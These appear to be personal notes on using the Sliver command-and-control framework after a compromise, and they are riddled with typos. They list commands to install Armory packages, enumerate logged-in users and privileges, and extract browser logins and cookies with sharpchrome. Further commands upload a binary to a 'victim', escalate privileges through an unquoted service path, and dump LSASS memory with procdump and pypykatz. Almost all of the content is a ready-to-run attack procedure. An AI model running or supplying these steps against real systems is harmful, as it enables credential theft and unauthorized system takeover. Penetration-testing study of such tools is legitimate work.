
```
armory install mimikatz
```
`Using Armory to install Tools`


<h3>WHat is Armory</h3>

It is an Entension Packsage Manger Which allows youu to install 3rd party toools

```
armory
```
`This will shows you all the avabilabe Packages you can insstall`

<h3> How to reame an Session</h3>
```
sessions -i id
rename -n name
```

<h3>Enum</h3>
```
info
```

```
getprivs
```

```
getuid
```

```
ps
```
`TO ssee process`

```
armory install sa-netloggedon
```

```
help sa-netloggedon
```

```
sa-netloggedon HOSTANAME_OF_TARGET
```
`THis will show you all the loggedin Users in that Machine`

```
sa-whoami
```

<h3>Creds Extraction</h3>

```
armory install sharpchrome
```
`We can extract Cookie ,logins and satekeys`


```
sharpchrome logins /browser:edge
```

<h3> SLiver Privilege Escalation</h3>

```
upload '/home/antivenom/hacker.exe' 'C:\Users\Public\Hacker.exe'
```
`Using an Existing Session to Uplaod an Life form your Local machine to the VIctim`

**Search for Powershell or cmd command to find Unquoted path Which can lead to Priv Esc**

```
armory insatll sa-cacls
```
`Hepls TO check the Permisioons(ACLs) On File Paths and Files`

```
sa-cacls 'C:\Program Files\AWS labs\'
```

```
armory install remote-sc-start
```
`Starts Service That Will Execute binary with Elevated Privlaeges`

```
remote-sc-start AWSlabs
```

```
getsystem
```
`If your ADmin Shell Dies Quikly Then USe THis to get Another Stable session`

<h3>Credential Harvesting</h3>

`Local Security Authentication Subsystem Service`

```
ps
```
`TTo get the PID of Lsass`

```
procdump -p <PID of LSASS>
```

```
pypykatz lsa mimidump /path/to/dump
```


